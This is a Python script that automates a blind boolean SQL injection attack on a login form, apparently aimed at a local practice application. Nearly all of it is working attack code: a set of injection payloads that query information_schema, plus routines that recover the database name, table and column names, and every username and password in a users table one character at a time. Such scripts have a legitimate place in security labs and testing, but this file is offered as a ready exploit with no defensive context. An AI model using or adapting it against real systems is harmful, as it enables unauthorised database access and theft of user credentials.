import requests

base_url = 'http://localhost:5000'  # Replace with the base URL of the vulnerable application

# SQL injection payloads to retrieve information
payloads = {
    'basic_test': "' OR 1=1-- ",
    'db_length': "admin' OR LENGTH(DATABASE()) = {}-- ",
    'db_name_char': "admin' OR ASCII(SUBSTRING(DATABASE(), {}, 1)) {} {}-- ",
    'table_names_length': "admin' OR LENGTH((SELECT GROUP_CONCAT(table_name SEPARATOR ', ') FROM information_schema.tables WHERE table_schema=DATABASE())) = {}-- ",
    'table_names_char': "admin' OR ASCII(SUBSTRING((SELECT GROUP_CONCAT(table_name SEPARATOR ', ') FROM information_schema.tables WHERE table_schema=DATABASE()), {}, 1)) {} {}-- ",
    'column_names_length': "admin' OR LENGTH((SELECT GROUP_CONCAT(column_name SEPARATOR ', ') FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='{}')) = {}-- ",
    'column_names_char': "admin' OR ASCII(SUBSTRING((SELECT GROUP_CONCAT(column_name SEPARATOR ', ') FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='{}'), {}, 1)) {} {}-- ",
    'usernames_length': "admin' OR LENGTH((SELECT GROUP_CONCAT(username SEPARATOR ', ') FROM users)) = {}-- ",
    'usernames_char': "admin' OR ASCII(SUBSTRING((SELECT GROUP_CONCAT(username SEPARATOR ', ') FROM users), {}, 1)) {} {}-- ",
    'passwords_length': "admin' OR LENGTH((SELECT GROUP_CONCAT(password SEPARATOR ', ') FROM users)) = {}-- ",
    'passwords_char': "admin' OR ASCII(SUBSTRING((SELECT GROUP_CONCAT(password SEPARATOR ', ') FROM users), {}, 1)) {} {}-- "
}

session = requests.Session()

def test_basic_sql_injection():
    payload = payloads['basic_test']
    response = session.post(f"{base_url}/login", data={'username': payload, 'password': 'irrelevant'})
    print(f"Basic test payload: {payload}")
    print(f"Response text: {response.text}")
    return 'Login failed' not in response.text

def extract_length(payload):
    for length in range(1, 100):  # Adjust range as necessary
        username = payload.format(length)
        response = session.post(f"{base_url}/login", data={'username': username, 'password': 'irrelevant'})
        print(f"Testing length {length} with payload: {username}")
        print(f"Response text: {response.text}")
        if 'Login failed' not in response.text:
            return length
    return None

def binary_search_char_position(payload_template, char_position, *args):
    low, high = 32, 126  # Printable ASCII range
    while low <= high:
        mid = (low + high) // 2
        payload = payload_template.format(*args, char_position, '=', mid)
        response = session.post(f"{base_url}/login", data={'username': payload, 'password': 'irrelevant'})
        print(f"Payload: {payload}")
        print(f"Response text: {response.text}")
        if 'Login failed' not in response.text:
            return chr(mid)
        else:
            payload = payload_template.format(*args, char_position, '<', mid)
            response = session.post(f"{base_url}/login", data={'username': payload, 'password': 'irrelevant'})
            if 'Login failed' not in response.text:
                high = mid - 1
            else:
                low = mid + 1
    return None

def extract_data(payload_template, length, *args):
    data = ""
    for position in range(1, length + 1):
        char = binary_search_char_position(payload_template, position, *args)
        if char:
            data += char
            print(f"Found character: {char} -> Current data: {data}")
        else:
            print(f"Failed to retrieve character at position {position}.")
            break
    return data

def extract_data_with_length(length_payload, data_payload, *args):
    # Determine the length of the data
    if args:
        length = extract_length(length_payload.format(*args))
    else:
        length = extract_length(length_payload)
    if not length:
        print("Failed to determine data length.")
        return None
    return extract_data(data_payload, length, *args)

def main():
    # Test basic SQL injection
    if not test_basic_sql_injection():
        print("Basic SQL injection test failed.")
        return
    print("Basic SQL injection test succeeded.")

    # Retrieve database name length
    db_length_payload = payloads['db_length']
    db_length = extract_length(db_length_payload)
    if not db_length:
        print("Failed to determine database name length.")
        return

    print(f"Database name length: {db_length}")

    # Retrieve database name
    db_name_payload = payloads['db_name_char']
    database_name = extract_data(db_name_payload, db_length)
    if not database_name:
        print("Failed to retrieve database name.")
        return

    print(f"Database name: {database_name}")

    # Retrieve table names
    table_names_length_payload = payloads['table_names_length']
    table_names_char_payload = payloads['table_names_char']
    table_names = extract_data_with_length(table_names_length_payload, table_names_char_payload)
    if not table_names:
        print("Failed to retrieve table names.")
        return
    tables = table_names.split(', ')

    print("Tables:")
    for table in tables:
        print(f"- {table}")

    # Retrieve column names for a specific table (assuming 'users' table here)
    column_names_length_payload = payloads['column_names_length'].format('users')
    column_names_char_payload = payloads['column_names_char']
    column_names = extract_data_with_length(column_names_length_payload, column_names_char_payload, 'users')
    if not column_names:
        print("Failed to retrieve column names.")
        return
    columns = column_names.split(', ')

    print("Columns in 'users' table:")
    for column in columns:
        print(f"- {column}")

    # Retrieve usernames
    usernames_length_payload = payloads['usernames_length']
    usernames_char_payload = payloads['usernames_char']
    usernames = extract_data_with_length(usernames_length_payload, usernames_char_payload)
    if not usernames:
        print("Failed to retrieve usernames.")
        return
    usernames = usernames.split(', ')

    print("Usernames:")
    for username in usernames:
        print(f"- {username}")

    # Retrieve passwords
    passwords_length_payload = payloads['passwords_length']
    passwords_char_payload = payloads['passwords_char']
    passwords = extract_data_with_length(passwords_length_payload, passwords_char_payload)
    if not passwords:
        print("Failed to retrieve passwords.")
        return
    passwords = passwords.split(', ')

    print("Usernames and Passwords:")
    for i in range(len(usernames)):
        print(f"- Username: {usernames[i]}, Password: {passwords[i]}")

if __name__ == "__main__":
    main()












    

